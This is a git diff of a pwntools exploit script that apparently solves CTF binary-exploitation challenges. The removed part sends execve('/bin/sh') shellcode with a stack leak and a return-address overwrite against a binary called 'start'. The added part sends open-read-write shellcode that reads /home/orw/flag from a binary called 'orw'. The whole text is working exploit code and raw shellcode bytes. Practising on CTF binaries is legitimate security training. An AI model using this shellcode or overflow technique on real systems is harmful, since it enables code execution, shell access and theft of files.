@@ -10,13 +10,13 @@ def start(argv=[], *a, **kw):
 
 gdbscript = '''
 init-pwndbg
-r
+b *main
 continue
 '''.format(**locals())
 
-exe = './start'
+exe = './orw'
 
-elf = context.binary = ELF(exe)
+elf = ELF(exe)
 
 sla  = lambda r, s: conn.sendlineafter(r, s)
 sl   = lambda    s: conn.sendline(s)
@@ -29,23 +29,11 @@ uu64 = lambda d: u64(d.ljust(8, b'\x00'))
 
 conn = start()
 
-add = 0x8048087
+shellcode = b"\x55\x89\xEC\x83\xEC\x20\x6A\x05\x58\x6A\x00\x68\x66\x6C\x61\x67\x68\x6F\x72\x77\x2F\x68\x6F\x6D\x65\x2F\x68\x2F\x2F\x2F\x68\x89\xE3\xB9\x02\x00\x00\x00\x31\xD2\xCD\x80\x89\xC3\xB8\x03\x00\x00\x00\xB9\x00\xA0\x04\x08\xBA\x40\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\xB9\x00\xA0\x04\x08\xBA\x40\x00\x00\x00\xCD\x80"
 
-shellcode = b"\x31\xC9\x31\xD2\xB0\x0B\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80"
-
-sa(b'CTF:', shellcode + p32(add))
-
-leak = conn.recv()
-
-leak_stack = u32(leak[0:4].ljust(4, b'\x00'))
-
-print(hex(leak_stack))
-
-pause()
-
-sl(b'A' * 0x14 + p32(leak_stack - 0x1c) + p32(0))
-
-#print(hex(leak_stack))
+conn.recvuntil(b'shellcode:')
+#sla(b'shellcode:', shellcode)
+conn.sendline(shellcode)
 
 conn.interactive()
 
